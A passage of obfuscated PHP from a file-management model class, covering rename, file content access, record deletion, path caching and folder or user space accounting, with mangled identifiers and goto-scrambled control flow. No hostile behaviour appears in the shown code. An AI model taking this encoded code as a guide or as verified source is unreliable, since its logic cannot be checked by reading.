£Üç[$A™´Í„Ê‹Ö[461]]); $bèøò‰Ç  = $this->field($A™´Í„Ê‹Ö[2404])->where($eÒ’èñÆŒ)->select(); $Aø§¿Â•ˆ = !1; $bì¢×ÕØ Ç = array($e•®¨ÃµÁ); if ($bèøò‰Ç ) { $Aø§¿Â•ˆ = array_to_keyvalue($bèøò‰Ç , $A™´Í„Ê‹Ö[33], $A™´Í„Ê‹Ö[419]); $Aø§¿Â•ˆ = array_remove_value($Aø§¿Â•ˆ, $A™´Í„Ê‹Ö[470]); $bì¢×ÕØ Ç = array_to_keyvalue($bèøò‰Ç , $A™´Í„Ê‹Ö[33], $A™´Í„Ê‹Ö[369]); $bì¢×ÕØ Ç[] = $e•®¨ÃµÁ; } } else { $Aø§¿Â•ˆ = array($c„Âœñ„İ[$A™´Í„Ê‹Ö[419]]); $bì¢×ÕØ Ç = array($e•®¨ÃµÁ); } return array($A™´Í„Ê‹Ö[2401] => $bì¢×ÕØ Ç, $A™´Í„Ê‹Ö[1278] => $Aø§¿Â•ˆ); } public function removeArray($a³º’ªÕ¾Ğ) { if (!$a³º’ªÕ¾Ğ) { return !0; } } public function removeRelevance($b¾¢Ãïæšì, $d’æ®œ¹âí) { goto EìŞÅóˆª; EœÒ«ßĞ«‡: Model($bØ¡…™Ùî[2256])->where($BŠ†ˆÄùØ‡)->delete(); Model($bØ¡…™Ùî[507])->where($BŠ†ˆÄùØ‡)->delete(); Model($bØ¡…™Ùî[2104])->removeBySource($b¾¢Ãïæšì); goto D°ÌÂÍÁ³Ë; EìŞÅóˆª: $bØ¡…™Ùî =& $_SERVER[ã®Â„Éæ¹¤]; $b¾¢Ãïæšì = $b¾¢Ãïæšì ? $b¾¢Ãïæšì : array(); $d’æ®œ¹âí = $d’æ®œ¹âí ? $d’æ®œ¹âí : array(); goto b²Úº‡Äƒ; b²Úº‡Äƒ: $b¾¢Ãïæšì = array_unique(array_filter($b¾¢Ãïæšì)); $d’æ®œ¹âí = array_unique(array_filter($d’æ®œ¹âí)); if (!$b¾¢Ãïæšì) { return !1; } goto e‚ÑÒšÃ‹…; e‚ÑÒšÃ‹…: $BŠ†ˆÄùØ‡ = array($bØ¡…™Ùî[383] => array($bØ¡…™Ùî[384], $b¾¢Ãïæšì)); Model($bØ¡…™Ùî[2402])->where($BŠ†ˆÄùØ‡)->delete(); Model($bØ¡…™Ùî[413])->where($BŠ†ˆÄùØ‡)->delete(); goto EœÒ«ßĞ«‡; D°ÌÂÍÁ³Ë: Model($bØ¡…™Ùî[2383])->removeBySource($b¾¢Ãïæšì); $this->where($BŠ†ˆÄùØ‡)->delete(); Model($bØ¡…™Ùî[422])->remove($d’æ®œ¹âí); goto d„˜”áÂÇ; d„˜”áÂÇ: for ($EÌ·Šğ†ê = 0; $EÌ·Šğ†ê < count($b¾¢Ãïæšì); $EÌ·Šğ†ê++) { $this->sourceCacheClear($b¾¢Ãïæšì[$EÌ·Šğ†ê]); } goto bÙ¢‹õ‰—È; bÙ¢‹õ‰—È: } public function rename($fÇİÁ±†Ìœ, $Eê¿øï°¾†) { goto e„†Î´¼ÕÏ; C¹ğãÖ¿Ë­: $this->setNamePinyin($fÇİÁ±†Ìœ, $AÆ¿ÏÈêéì[$f…• ¬ÌÙÓ[28]], !1); $this->updateModifyTime($f»ö‡´õè[$f…• ¬ÌÙÓ[463]]); $b†“ö‘çŞ™ = $this->where(array($f…• ¬ÌÙÓ[383] => $fÇİÁ±†Ìœ))->data($AÆ¿ÏÈêéì)->save(); goto B¨™“‰œ£‰; C›è–ñ¶Åá: if (!$f»ö‡´õè[$f…• ¬ÌÙÓ[370]] == $f…• ¬ÌÙÓ[83]) { $AÆ¿ÏÈêéì[$f…• ¬ÌÙÓ[372]] = get_path_ext($Eê¿øï°¾†); } Model($f…• ¬ÌÙÓ[507])->eventRename($fÇİÁ±†Ìœ, $f»ö‡´õè[$f…• ¬ÌÙÓ[28]], $Eê¿øï°¾†); $this->sourceCacheClear($fÇİÁ±†Ìœ); goto C¹ğãÖ¿Ë­; B¨™“‰œ£‰: $a¹…Èø³Á = $f…• ¬ÌÙÓ[2391] . $f»ö‡´õè[$f…• ¬ÌÙÓ[463]]; if (isset(self::$cacheChildList[$a¹…Èø³Á])) { unset(self::$cacheChildList[$a¹…Èø³Á]); } return $b†“ö‘çŞ™; goto dÇÜÕÓØ¿¥; C±–ˆŸÃ¨œ: $DÄ¿ÄÑ‘Îˆ = $this->fileNameExist($f»ö‡´õè[$f…• ¬ÌÙÓ[463]], $Eê¿øï°¾†); if ($DÄ¿ÄÑ‘Îˆ && $DÄ¿ÄÑ‘Îˆ != $fÇİÁ±†Ìœ) { return !1; } $AÆ¿ÏÈêéì = array($f…• ¬ÌÙÓ[386] => $Eê¿øï°¾†, $f…• ¬ÌÙÓ[526] => USER_ID); goto C›è–ñ¶Åá; e„†Î´¼ÕÏ: $f…• ¬ÌÙÓ =& $_SERVER[ã®Â„Éæ¹¤]; $f»ö‡´õè = $this->sourceInfo($fÇİÁ±†Ìœ); if (!$f»ö‡´õè) { return !1; } goto C±–ˆŸÃ¨œ; dÇÜÕÓØ¿¥: } public function setNamePinyin($F ÁÖÒ†À–, $dƒ‘ÎàâğÍ, $FÖ¡¾††Ã„ = true) { $B«æîíâ¥ =& $_SERVER[ã®Â„Éæ¹¤]; $cİ×ãÍùµ‡ = Input::check($dƒ‘ÎàâğÍ, $B«æîíâ¥[530]); if ($FÖ¡¾††Ã„ && !$cİ×ãÍùµ‡) { return; } if (!$cİ×ãÍùµ‡) { $this->metaSet($F ÁÖÒ†À–, $B«æîíâ¥[416], null); $this->metaSet($F ÁÖÒ†À–, $B«æîíâ¥[415], null); return; } $B„î—óâ’ = array($B«æîíâ¥[416] => str_replace($B«æîíâ¥[50], $B«æîíâ¥[33], Pinyin::encode($dƒ‘ÎàâğÍ)), $B«æîíâ¥[415] => Pinyin::encode($dƒ‘ÎàâğÍ, $B«æîíâ¥[531])); $this->metaSet($F ÁÖÒ†À–, $B„î—óâ’); } public function getContent($D‘½Á¥…‡ò) { goto fÜšÙšã”±; DØ»áåîŞä: if ($cŞÖˆÜğ¹[$cŞ¥î‰òÀà[77]] == 0) { return $cŞ¥î‰òÀà[33]; } $fÕ÷µïšŒæ = $cŞ¥î‰òÀà[2405] . $cŞÖˆÜğ¹[$cŞ¥î‰òÀà[163]]; if ($cŞÖˆÜğ¹[$cŞ¥î‰òÀà[77]] <= 1024 * 10) { $fã‡±‰¥…â = Cache::get($fÕ÷µïšŒæ); if (!$fã‡±‰¥…â) { $fã‡±‰¥…â = IO::getContent($cŞÖˆÜğ¹[$cŞ¥î‰òÀà[75]]); Cache::set($fÕ÷µïšŒæ, $fã‡±‰¥…â); } return $fã‡±‰¥…â; } goto EÔ ôŸ‚ˆ; fÜšÙšã”±: $cŞ¥î‰òÀà =& $_SERVER[ã®Â„Éæ¹¤]; $cŞÖˆÜğ¹ = $this->fileInfoGet($D‘½Á¥…‡ò); if (!$cŞÖˆÜğ¹) { return !1; } goto DØ»áåîŞä; EÔ ôŸ‚ˆ: if (!$cŞÖˆÜğ¹[$cŞ¥î‰òÀà[75]]) { return $cŞ¥î‰òÀà[33]; } return IO::getContent($cŞÖˆÜğ¹[$cŞ¥î‰òÀà[75]]); goto fÒ‘ùÃÊ¯µ; fÒ‘ùÃÊ¯µ: } public function setDesc($AÇåîÅ–Í¨, $b¿”ŠÛçäõ) { $f¾§¿ÇŠ¡ =& $_SERVER[ã®Â„Éæ¹¤]; Model($f¾§¿ÇŠ¡[507])->eventAddDesc($AÇåîÅ–Í¨, $b¿”ŠÛçäõ); return $this->metaSet($AÇåîÅ–Í¨, $f¾§¿ÇŠ¡[405], $b¿”ŠÛçäõ); } public function setContent($DÅÄÖ¶ˆçğ, $Céåªñ‚ï¶ = '') { goto A–ĞñÖ ãø; CºæáäïŞç: if (!$c¦¹ƒŸÛºÂ) { return Model($e–¹««àŒ¿[422])->remove($C„ªï´æ™¦[$e–¹««àŒ¿[419]]); } $this->folderSizeReset($F¬Ù•¾Ğ“á[$e–¹««àŒ¿[463]]); return !0; goto E–™èŠğÖç; aíÅÙçå¡Ğ: if (!$Cå×ŒÓ–¶” || !$F¬Ù•¾Ğ“á) { return !1; } $C„ªï´æ™¦ = Model($e–¹««àŒ¿[422])->addFileByContent($Céåªñ‚ï¶, $F¬Ù•¾Ğ“á[$e–¹««àŒ¿[28]]); $c¦¹ƒŸÛºÂ = $this->fileHistory($F¬Ù•¾Ğ“á, $C„ªï´æ™¦[$e–¹««àŒ¿[419]], $C„ªï´æ™¦[$e–¹««àŒ¿[77]]); goto CºæáäïŞç; A–ĞñÖ ãø: $e–¹««àŒ¿ =& $_SERVER[ã®Â„Éæ¹¤]; $F¬Ù•¾Ğ“á = $this->sourceInfo($DÅÄÖ¶ˆçğ); $Cå×ŒÓ–¶” = $this->fileInfoGet($DÅÄÖ¶ˆçğ); goto aíÅÙçå¡Ğ; E–™èŠğÖç: } public function fileSubstr($F§í’òŸ¤æ, $c­§çÀòºö, $Dµµ„æ–Ğİ) { $BºÅÀÖ‹ÊÕ = $this->fileInfoGet($F§í’òŸ¤æ); if (!$BºÅÀÖ‹ÊÕ) { return !1; } return IO::fileSubstr($BºÅÀÖ‹ÊÕ[$_SERVER[ã®Â„Éæ¹¤][75]], $c­§çÀòºö, $Dµµ„æ–Ğİ); } public function fileInfoGet($bÕ‘Äâã) { goto Fí‰¿Ù’Â‹; e…™Ú†”Œ: return $dƒñ©İôµ±; goto e™„‚—¯ì«; càÑŒÔÌò¾: $Cí®¿Åï—ß = $FŒ‰ÍÌ™¼[425] . $bÑÓ­¿Ò×†[$FŒ‰ÍÌ™¼[419]]; $F’‡°í‡ˆ¨ = _get(self::$cacheFileInfo, $Cí®¿Åï—ß); if ($F’‡°í‡ˆ¨) { return $F’‡°í‡ˆ¨; } goto eíó—ñœˆó; eíó—ñœˆó: $dƒñ©İôµ± = Model($FŒ‰ÍÌ™¼[422])->fileInfo($bÑÓ­¿Ò×†[$FŒ‰ÍÌ™¼[419]]); if ($dƒñ©İôµ±) { $dƒñ©İôµ±[$FŒ‰ÍÌ™¼[28]] = $bÑÓ­¿Ò×†[$FŒ‰ÍÌ™¼[28]]; } self::$cacheFileInfo[$Cí®¿Åï—ß] = $dƒñ©İôµ±; goto e…™Ú†”Œ; Fí‰¿Ù’Â‹: $FŒ‰ÍÌ™¼ =& $_SERVER[ã®Â„Éæ¹¤]; $bÑÓ­¿Ò×† = $this->sourceInfo($bÕ‘Äâã); if (!$bÑÓ­¿Ò×† || $bÑÓ­¿Ò×†[$FŒ‰ÍÌ™¼[370]]) { return !1; } goto càÑŒÔÌò¾; e™„‚—¯ì«: } private function folderChildrenNumber($CòÔ°Ÿ¿ñÉ) { $aøƒ£ÆµŞ =& $_SERVER[ã®Â„Éæ¹¤]; $f¦ÆäÈ†²° = $this->sourceInfo($CòÔ°Ÿ¿ñÉ); $a¶óµ…¼ = array($aøƒ£ÆµŞ[527] => array($aøƒ£ÆµŞ[485], $f¦ÆäÈ†²°[$aøƒ£ÆµŞ[461]] . $CòÔ°Ÿ¿ñÉ . $aøƒ£ÆµŞ[486]), $aøƒ£ÆµŞ[396] => intval($f¦ÆäÈ†²°[$aøƒ£ÆµŞ[397]]), $aøƒ£ÆµŞ[520] => 1); $D‘‘§»ó•ò = $this->where($a¶óµ…¼)->count(); $d’èÓ š—î = $this->where($a¶óµ…¼)->where(array($aøƒ£ÆµŞ[520] => 0))->count(); return array($aøƒ£ÆµŞ[81] => $d’èÓ š—î, $aøƒ£ÆµŞ[82] => $D‘‘§»ó•ò); } public function pathInfo($DîíèÆ’¥ö, $cñŸ»„¯À„ = false) { goto aÔù—Ò¨¾; D‘Û²˜ÆŸ : self::$cachePathInfo[$f¡êŞ©·À—] = $dŸ ¯¾øöÆ; return $dŸ ¯¾øöÆ; goto F¹“æì†©˜; aÔù—Ò¨¾: $fØƒ…³»‘­ =& $_SERVER[ã®Â„Éæ¹¤]; $cñŸ»„¯À„ = !1; $DîíèÆ’¥ö = intval($DîíèÆ’¥ö); goto f±…ßœÊ“Ê; cë°’µÖÊ†: $dŸ ¯¾øöÆ = $this->sourceInfo($DîíèÆ’¥ö); if (!$dŸ ¯¾øöÆ) { return !1; } $dŸ ¯¾øöÆ = $this->_listDataApplyItem($dŸ ¯¾øöÆ, $cñŸ»„¯À„); goto D‘Û²˜ÆŸ ; f±…ßœÊ“Ê: $f¡êŞ©·À— = $fØƒ…³»‘­[411] . intval($cñŸ»„¯À„) . $fØƒ…³»‘­[412] . $DîíèÆ’¥ö; $Bê›àä ±Ó = _get(self::$cachePathInfo, $f¡êŞ©·À—); if ($Bê›àä ±Ó) { return $Bê›àä ±Ó; } goto cë°’µÖÊ†; F¹“æì†©˜: } public static $cachePathInfoMore = array(); public function pathInfoMore($AÈõ¢áÆÓ) { goto cÙ°áÖãˆğ; cÙ°áÖãˆğ: $dà™¦á…Ø„ =& $_SERVER[ã®Â„Éæ¹¤]; $eÍÕø¹®Õ¨ = _get(self::$cachePathInfoMore, $AÈõ¢áÆÓ); if ($eÍÕø¹®Õ¨) { return $eÍÕø¹®Õ¨; } goto F˜…¯‰½ßˆ; a¸İàåÃª¾: self::$cachePathInfoMore[$AÈõ¢áÆÓ] = $aÃ¦÷¯ÕÖ; return $aÃ¦÷¯ÕÖ; goto eŒˆÊ’Æ; F˜…¯‰½ßˆ: $aÃ¦÷¯ÕÖ = $this->pathInfo($AÈõ¢áÆÓ); if (!$aÃ¦÷¯ÕÖ) { return !1; } if ($aÃ¦÷¯ÕÖ[$dà™¦á…Ø„[370]] == $dà™¦á…Ø„[83]) { $aÃ¦÷¯ÕÖ[$dà™¦á…Ø„[80]] = $this->folderChildrenNumber($AÈõ¢áÆÓ); } goto a¸İàåÃª¾; eŒˆÊ’Æ: } public function sourceInfo($eöÄ‰ğ£) { goto c‘ìéä; B„½§·æç…: $a¼‹ƒèñ¶• = $eÛ„·†ã»Í[410] . $eöÄ‰ğ£; $EŞóºá÷®˜ = _get(self::$cacheSourceInfo, $a¼‹ƒèñ¶•); if ($EŞóºá÷®˜) { return $EŞóºá÷®˜; } goto FßÄâ©´êÌ; c‘ìéä: $eÛ„·†ã»Í =& $_SERVER[ã®Â„Éæ¹¤]; if (!$eöÄ‰ğ£) { return array(); } $eöÄ‰ğ£ = intval($eöÄ‰ğ£); goto B„½§·æç…; FßÄâ©´êÌ: $aïòøÙÛ‡İ = $this->where(array($eÛ„·†ã»Í[369] => $eöÄ‰ğ£))->find(); self::$cacheSourceInfo[$a¼‹ƒèñ¶•] = $aïòøÙÛ‡İ; return self::$cacheSourceInfo[$a¼‹ƒèñ¶•]; goto b…ï’Ó‰½Ï; b…ï’Ó‰½Ï: } public function sourceCacheClear($F¬–•Ü´‡ = false) { if ($F¬–•Ü´‡ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[ã®Â„Éæ¹¤][410] . $F¬–•Ü´‡]); } public function pathInfoByPath($fîÉîØÃ¿À, $Bñº«…ÇÌ‚) { $AÂÁ«ËÃ§ =& $_SERVER[ã®Â„Éæ¹¤]; $c£Ò±ËÚÔÃ = !$Bñº«…ÇÌ‚ ? array() : explode($AÂÁ«ËÃ§[8], trim($Bñº«…ÇÌ‚, $AÂÁ«ËÃ§[8])); $C‹Î¶œÔÊ = $fîÉîØÃ¿À; foreach ($c£Ò±ËÚÔÃ as $B×Âù“ƒ£) { $Bö‹îİßã‡ = array($AÂÁ«ËÃ§[463] => $C‹Î¶œÔÊ, $AÂÁ«ËÃ§[28] => $B×Âù“ƒ£); $D¢Âõ•ø‚ƒ = $this->where($Bö‹îİßã‡)->select(); if (!$D¢Âõ•ø‚ƒ) { return !1; } $D¢Âõ•ø‚ƒ = array_sort_by($D¢Âõ•ø‚ƒ, $AÂÁ«ËÃ§[397]); $C‹Î¶œÔÊ = $D¢Âõ•ø‚ƒ[0][$AÂÁ«ËÃ§[369]]; } return $this->pathInfo($C‹Î¶œÔÊ, !0); } protected function updateModifyTime($c†–ß’©¨) { goto FåÛ¯¬ä¥¿; A«ñ¤’×Ğ¼: $this->where($f•ÚœÜ¦Î)->save($FÓïßŸ×ê¥); goto C¢ñÒÉğåŒ; FåÛ¯¬ä¥¿: $DÛùøËÎÌ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$c†–ß’©¨) { return; } if (!is_array($c†–ß’©¨)) { $c†–ß’©¨ = array($c†–ß’©¨); } goto EİÌœË¾Ğ¦; EİÌœË¾Ğ¦: foreach ($c†–ß’©¨ as $D¥öß™œ½ => $dÍñ²Œæé‹) { $c†–ß’©¨[$D¥öß™œ½] = intval($dÍñ²Œæé‹); } $f•ÚœÜ¦Î = array($DÛùøËÎÌ[369] => array($DÛùøËÎÌ[7], $c†–ß’©¨)); $FÓïßŸ×ê¥ = array($DÛùøËÎÌ[526] => USER_ID, $DÛùøËÎÌ[390] => time()); goto A«ñ¤’×Ğ¼; C¢ñÒÉğåŒ: } public function folderSizeReset($BÕ§ÙŸ½Ñ) { goto b¾¿¸Äóå¸; EÖé³¼Ø—: CacheLock::lock($aë‹¡Ÿ™, 20); $this->sourceCacheClear($BÕ§ÙŸ½Ñ); $D®Ùø¸¡º = $this->sourceInfo($BÕ§ÙŸ½Ñ); goto bÎ‚„ÜìÀ; aÄŠí©Ù¤Õ: $d÷æÉ„‰Óµ = $BéŞ’·Ì¯ - intval($D®Ùø¸¡º[$EºÒ«¨å‹¼[77]]); if ($d÷æÉ„‰Óµ == 0) { return CacheLock::unlock($aë‹¡Ÿ™); } $this->where(array($EºÒ«¨å‹¼[383] => $BÕ§ÙŸ½Ñ))->setField($EºÒ«¨å‹¼[77], $BéŞ’·Ì¯); goto D³¤òŠã‚…; b¾¿¸Äóå¸: $EºÒ«¨å‹¼ =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->statusIgnoreResetSpace) { return; } $aë‹¡Ÿ™ = $EºÒ«¨å‹¼[2406] . $BÕ§ÙŸ½Ñ; goto EÖé³¼Ø—; d‰èñ É‘†: CacheLock::unlock($aë‹¡Ÿ™); goto C¼Â““†È·; D³¤òŠã‚…: $DÔäÙÍÛÇƒ = $this->parentLevelArray($D®Ùø¸¡º[$EºÒ«¨å‹¼[461]]); if ($DÔäÙÍÛÇƒ) { $E‚”ºù·‹Ì = array($EºÒ«¨å‹¼[369] => array($EºÒ«¨å‹¼[384], $DÔäÙÍÛÇƒ)); if ($d÷æÉ„‰Óµ < 0) { $E‚”ºù·‹Ì[$EºÒ«¨å‹¼[77]] = array($EºÒ«¨å‹¼[947], abs($d÷æÉ„‰Óµ)); } $this->where($E‚”ºù·‹Ì)->setAdd($EºÒ«¨å‹¼[77], $d÷æÉ„‰Óµ); } $this->targetSpaceUpdate($D®Ùø¸¡º[$EºÒ«¨å‹¼[371]], $D®Ùø¸¡º[$EºÒ«¨å‹¼[458]]); goto d‰èñ É‘†; bÎ‚„ÜìÀ: $E‚”ºù·‹Ì = array($EºÒ«¨å‹¼[368] => $BÕ§ÙŸ½Ñ, $EºÒ«¨å‹¼[396] => 0); $BéŞ’·Ì¯ = $this->where($E‚”ºù·‹Ì)->sum($EºÒ«¨å‹¼[77]); $BéŞ’·Ì¯ = intval($BéŞ’·Ì¯); goto aÄŠí©Ù¤Õ; C¼Â““†È·: } public function folderSizeResetChildren($Dœ·‹ø•©¹) { goto cÜìÜ¦Œé›; A‘ÖÑ°Ìˆ‘: $F‡•ØìÎáå[] = $cÎÕæğ²Ÿ£; $F‡•ØìÎáå = array_to_keyvalue($F‡•ØìÎáå, $câ‹”ì¸¯©[369]); foreach ($F‡•ØìÎáå as $B…Ğé«ìô => $BÆª£Öù†”) { $F‡•ØìÎáå[$B…Ğé«ìô][$câ‹”ì¸¯©[2408]] = $F‡•ØìÎáå[$B…Ğé«ìô][$câ‹”ì¸¯©[77]]; $F‡•ØìÎáå[$B…Ğé«ìô][$câ‹”ì¸¯©[77]] = 0; } goto EÑÒ‹¸ùö; EÑÒ‹¸ùö: foreach ($E×É·‘Ÿõ† as $BÆª£Öù†”) { $b¢£•Ãœ— = $BÆª£Öù†”[$câ‹”ì¸¯©[463]] . $câ‹”ì¸¯©[33]; if (!isset($F‡•ØìÎáå[$b¢£•Ãœ—])) { continue; } if ($BÆª£Öù†”[$câ‹”ì¸¯©[397]] == $F‡•ØìÎáå[$b¢£•Ãœ—][$câ‹”ì¸¯©[397]]) { $F‡•ØìÎáå[$b¢£•Ãœ—][$câ‹”ì¸¯©[77]] += $BÆª£Öù†”[$câ‹”ì¸¯©[77]]; } } foreach ($F‡•ØìÎáå as $BÆª£Öù†”) { $eŒãÃ©ÏÀ† = $this->parentLevelArray($BÆª£Öù†”[$câ‹”ì¸¯©[461]]); foreach ($eŒãÃ©ÏÀ† as $b¢£•Ãœ—) { $b¢£•Ãœ— = $b¢£•Ãœ— . $câ‹”ì¸¯©[33]; if (!isset($F‡•ØìÎáå[$b¢£•Ãœ—])) { continue; } if ($BÆª£Öù†”[$câ‹”ì¸¯©[397]] == $F‡•ØìÎáå[$b¢£•Ãœ—][$câ‹”ì¸¯©[397]]) { $F‡•ØìÎáå[$b¢£•Ãœ—][$câ‹”ì¸¯©[77]] += $BÆª£Öù†”[$câ‹”ì¸¯©[77]]; } } } $E–’†Ú×ãÖ = array(); goto D£µĞÅÑ¹; D£µĞÅÑ¹: foreach ($F‡•ØìÎáå as $BÆª£Öù†”) { if ($BÆª£Öù†”[$câ‹”ì¸¯©[77]] == $BÆª£Öù†”[$câ‹”ì¸¯©[2408]]) { continue; } $E–’†Ú×ãÖ[] = array($câ‹”ì¸¯©[369], $BÆª£Öù†”[$câ‹”ì¸¯©[369]], $câ‹”ì¸¯©[77], $BÆª£Öù†”[$câ‹”ì¸¯©[77]]); } $this->saveAll($E–’†Ú×ãÖ); goto d±æêéµå÷; cÜìÜ¦Œé›: $câ‹”ì¸¯© =& $_SERVER[ã®Â„Éæ¹¤]; $this->sourceCacheClear($Dœ·‹ø•©¹); $cÎÕæğ²Ÿ£ = $this->sourceInfo($Dœ·‹ø•©¹); goto AÄÔ°ŒÕåÄ; dÛƒÇù±Ø: $D—À¤†¬¯–[$câ‹”ì¸¯©[370]] = 0; $E×É·‘Ÿõ† = $this->field($Bà®º‹„ì…)->where($D—À¤†¬¯–)->select(); if (!$E×É·‘Ÿõ†) { return; } goto A‘ÖÑ°Ìˆ‘; AÄÔ°ŒÕåÄ: $D—À¤†¬¯– = array($câ‹”ì¸¯©[520] => 1, $câ‹”ì¸¯©[527] => array($câ‹”ì¸¯©[485], $cÎÕæğ²Ÿ£[$câ‹”ì¸¯©[461]] . $Dœ·‹ø•©¹ . $câ‹”ì¸¯©[486])); $Bà®º‹„ì… = $câ‹”ì¸¯©[2407]; $F‡•ØìÎáå = $this->field($Bà®º‹„ì…)->where($D—À¤†¬¯–)->select(); goto dÛƒÇù±Ø; d±æêéµå÷: } public function userSpaceReset($cĞÈÎÏñ = false) { $B™¦é§âßÉ =& $_SERVER[ã®Â„Éæ¹¤]; $DÀöÛÈ±Ÿò = $this->where(array($B™¦é§âßÉ[371] => self::TYPE_USER, $B™¦é§âßÉ[458] => $cĞÈÎÏñ, $B™¦é§âßÉ[370] => 0))->sum($B™¦é§âßÉ[77]); Model($B™¦é§âßÉ[476])->userEdit($cĞÈÎÏñ, array($B™¦é§âßÉ[2113] => $DÀöÛÈ±Ÿò)); } public function targetSpaceUpdate($CĞ²‡¢öŸŸ, $CÊ¬ÚÜ¶ãÖ) { $AŠ¥Œ÷é =& $_SERVER[ã®Â„Éæ¹¤]; if (!$CÊ¬ÚÜ¶ãÖ) { return; } if (!in_array($CĞ²‡¢öŸŸ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $d§—Û¦¸Ü¯ = $this->targetSpaceSize($CĞ²‡¢öŸŸ, $CÊ¬ÚÜ¶ãÖ); if ($CĞ²‡¢öŸŸ == self::TYPE_USER) { Model($AŠ¥Œ÷é[476])->userEdit($CÊ¬ÚÜ¶ãÖ, array($AŠ¥Œ÷é[2113] => $d§—Û¦¸Ü¯)); } else { if ($CĞ²‡¢öŸŸ == self::TYPE_GROUP) { Model($AŠ¥Œ÷é[460])->groupEdit($CÊ¬ÚÜ¶ãÖ, array($AŠ¥Œ÷é[2113] => $d§—Û¦¸Ü¯)); } } } public function targetSpaceSize($C†Ê×Ãèìé, $EìÒ†»‹Öá) { goto b·¿‚ò£¡í; b®ÎšŠÆ·Ï: $aôõ ÌŞµ = floatval($bêÖÊƒ„ãğ[$B¡©Ôø¥ªÏ[77]]); $C¯¬¯Àİ¾‚ = array($B¡©Ôø¥ªÏ[527] => array($B¡©Ôø¥ªÏ[485], $B¡©Ôø¥ªÏ[472] . $bêÖÊƒ„ãğ[$B¡©Ôø¥ªÏ[369]] . $B¡©Ôø¥ªÏ[486])); $Aó’Ô‡å• = Model($B¡©Ôø¥ªÏ[395])->field($B¡©Ôø¥ªÏ[383])->where($C¯¬¯Àİ¾‚)->select(); goto cµåÚĞ¿«™; b·¿‚ò£¡í: $B¡©Ôø¥ªÏ =& $_SERVER[ã®Â„Éæ¹¤]; $bêÖÊƒ„ãğ = $this->sourceRoot($C†Ê×Ãèìé, $EìÒ†»‹Öá, !0); if (!$bêÖÊƒ„ãğ) { return 0; } goto b®ÎšŠÆ·Ï; F¬•é»á­Ò: return $aôõ ÌŞµ; goto EçÖîšğÏª; cµåÚĞ¿«™: $Aó’Ô‡å• = array_to_keyvalue($Aó’Ô‡å•, $B¡©Ôø¥ªÏ[33], $B¡©Ôø¥ªÏ[369]); $Aó’Ô‡å• = array_unique(array_filter($Aó’Ô‡å•)); if ($Aó’Ô‡å•) { $C¯¬¯Àİ¾‚ = array($B¡©Ôø¥ªÏ[383] => array($B¡©Ôø¥ªÏ[384], $Aó’Ô‡å•)); $aôõ ÌŞµ += floatval($this->where($C¯¬¯Àİ¾‚)->sum($B¡©Ôø¥ªÏ[77])); } goto F¬•é»á­Ò; EçÖîšğÏª: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($a‚±ãÜİ±ô) { return $this->fileTypeProfile($a‚±ãÜİ±ô, SourceModel::TYPE_USER); } public function groupFileTypeProfile($d˜÷ƒ½¨­î) { return $this->fileTypeProfile($d˜÷ƒ½¨­î, SourceModel::TYPE_GROUP); } private function fileTypeProfile($f††è‘¡±°, $a¤ˆ¶ªó°«) { goto Aèµò¦·æ; b¡°½ôøˆ: if ($EÌµ´Ê‚ç) { return $EÌµ´Ê‚ç; } $e‡èÔ·¿õÆ = array($e–ÕŸÅ‡ªé[520] => 0); if ($f††è‘¡±° != !1) { $e‡èÔ·¿õÆ[$e–ÕŸÅ‡ªé[458]] = $f††è‘¡±°; $e‡èÔ·¿õÆ[$e–ÕŸÅ‡ªé[371]] = $a¤ˆ¶ªó°«; } goto BòÂæó½·¹; Aèµò¦·æ: $e–ÕŸÅ‡ªé =& $_SERVER[ã®Â„Éæ¹¤]; $Eêõ»†øÉ = $e–ÕŸÅ‡ªé[2409] . $f††è‘¡±° . $e–ÕŸÅ‡ªé[70] . $a¤ˆ¶ªó°«; $EÌµ´Ê‚ç = Cache::get($Eêõ»†øÉ); goto b¡°½ôøˆ; BòÂæó½·¹: $FÉšêÈëß¦ = array(); $FÉšêÈëß¦[$e–ÕŸÅ‡ªé[2410]] = array($e–ÕŸÅ‡ªé[2411] => LNG($e–ÕŸÅ‡ªé[2410]), $e–ÕŸÅ‡ªé[2412] => $this->where($e‡èÔ·¿õÆ)->count(), $e–ÕŸÅ‡ªé[522] => $this->where($e‡èÔ·¿õÆ)->sum($e–ÕŸÅ‡ªé[77])); $aôÌÕ¿¯åÜ = KodIO::fileTypeList(); goto FË×ŠŒò—ê; FË×ŠŒò—ê: foreach ($aôÌÕ¿¯åÜ as $Døğ¡ßÎÒÛ => $f…¡ŒÜ²‹å) { $e‡èÔ·¿õÆ[$e–ÕŸÅ‡ªé[372]] = $this->fileTypeWhere($Døğ¡ßÎÒÛ); $FÉšêÈëß¦[$Døğ¡ßÎÒÛ] = array($e–ÕŸÅ‡ªé[2411] => $f…¡ŒÜ²‹å[$e–ÕŸÅ‡ªé[28]], $e–ÕŸÅ‡ªé[2412] => $this->where($e‡èÔ·¿õÆ)->count(), $e–ÕŸÅ‡ªé[522] => $this->where($e‡èÔ·¿õÆ)->sum($e–ÕŸÅ‡ªé[77])); } Cache::set($Eêõ»†øÉ, $FÉšêÈëß¦, 1200); return $FÉšêÈëß¦; goto CÔØßñ‘Ñš; CÔØßñ‘Ñš: } public function fileNameExist($CÀ®‘‰Òõè, $C¸ƒˆÏ¾) { $BÆ—ŠĞãø =& $_SERVER[ã®Â„Éæ¹¤]; $f±ĞÑãĞŠ­ = $this->childList($CÀ®‘‰Òõè); foreach ($f±ĞÑãĞŠ­ as $fÖöÃÊ¯äØ) { if ($fÖöÃÊ¯äØ[$BÆ—ŠĞãø[28]] == $C¸ƒˆÏ¾) { return $fÖöÃÊ¯äØ[$BÆ—ŠĞãø[369]]; } if (strtolower($fÖöÃÊ¯äØ[$BÆ—ŠĞãø[28]]) == strtolower($C¸ƒˆÏ¾)) { return $fÖöÃÊ¯äØ[$BÆ—ŠĞãø[369]]; } } return !1; } public function childList($F£ğù«’®») { goto Fù²ˆÏå¬÷; E·¹İ÷¨÷: self::$cacheChildList[$bÛƒ½ßƒÌˆ] = $Có³‡‰ì·£; foreach ($Có³‡‰ì·£ as $eÜÅ½İ¦’Ñ) { $bÛƒ½ßƒÌˆ = $CÈ•´Æªñ´[410] . 